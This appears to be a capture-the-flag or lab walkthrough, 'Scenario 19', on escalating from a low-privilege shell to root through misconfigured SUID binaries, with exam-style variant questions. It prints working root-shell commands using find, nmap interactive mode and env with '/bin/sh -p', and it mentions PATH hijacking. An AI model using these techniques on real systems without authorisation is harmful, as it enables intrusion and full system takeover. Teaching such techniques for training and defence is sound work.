# Scenario 19 — SUID binary abuse to root

**Difficulty:** 🟡 | **Time:** ~20 min | **Domains:** 06, 13
**Tools:** [GTFOBins](../../tools/metasploit.md), shell

## Story
You already have a low-priv SSH shell as `user` on 10.10.10.19. Escalate to root and read `/root/root.txt`.

## Step 1 — Enumerate SUID binaries
**What we're doing:** List any file with SUID bit owned by root.
```bash
find / -perm -4000 -user root -type f 2>/dev/null
```
**Expected finding:** Unusual entries like `/usr/bin/find`, `/usr/bin/nmap`, `/usr/bin/env`, `/usr/local/bin/cp`.

## Step 2 — Identify exploitable binary via GTFOBins
**What we're doing:** Cross-reference against GTFOBins SUID section.
```bash
# if /usr/bin/find has SUID:
find . -exec /bin/sh -p \; -quit
```
**Expected finding:** `# ` root prompt. The `-p` flag preserves EUID.

## Step 3 — Alternative: nmap interactive (old versions)
```bash
nmap --interactive
nmap> !sh
```
**Expected finding:** root shell.

## Step 4 — Alternative: env
```bash
/usr/bin/env /bin/sh -p
```

## Step 5 — Read the flag
```bash
id
cat /root/root.txt
```

## Step 6 — Final answer
**Answer format:** contents of `root.txt`.

## Gotchas across this chain
- Many shells drop privileges on startup unless `-p` is passed (`bash`, `sh`, `dash`). Always use `-p`.
- SUID is useless if the filesystem is mounted `nosuid` — check `mount | grep nosuid`.
- Custom SUID binaries: run `strings` and `ltrace` on them — often they call `system("ls")` with unqualified PATH → PATH hijack.

## Variant questions this scenario teaches
- "Which binary has the SUID bit set improperly?"
- "What is the SHA1 of /root/root.txt?"
- "What PATH-hijack payload works against `/usr/local/bin/backup`?"

